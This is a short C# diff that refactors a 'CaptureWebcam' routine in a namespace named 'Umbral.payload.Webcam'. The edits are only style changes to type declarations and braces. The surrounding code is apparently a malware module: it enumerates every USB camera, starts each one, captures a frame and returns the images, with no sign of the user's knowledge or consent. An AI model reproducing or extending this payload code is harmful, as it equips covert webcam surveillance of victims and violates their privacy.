@@ -11,7 +11,7 @@ namespace Umbral.payload.Webcam
     {
         internal static async Task<Dictionary<string, Bitmap>> CaptureWebcam()
         {
-            Dictionary<string, Bitmap> images = new Dictionary<string, Bitmap>();
+            var images = new Dictionary<string, Bitmap>();
 
             string[] devices = UsbCamera.FindDevices();
             int remaining = devices.Length;
@@ -20,11 +20,11 @@ namespace Umbral.payload.Webcam
             {
                 try
                 {
-                    var format = UsbCamera.GetVideoFormat(i)[0];
-                    var camera = new UsbCamera(i, format);
+                    UsbCamera.VideoFormat format = UsbCamera.GetVideoFormat(i)[0];
+                    UsbCamera camera = new UsbCamera(i, format);
                     camera.Start();
                     Thread.Sleep(1000);
-                    var image = camera.GetBitmap();
+                    Bitmap image = camera.GetBitmap();
                     if (image != null)
                         images.Add(devices[i], image);
 
@@ -38,7 +38,9 @@ namespace Umbral.payload.Webcam
             });
 
             while (remaining > 0)
-            { await Task.Delay(1000); }
+            {
+                await Task.Delay(1000);
+            }
 
             return images;
         }
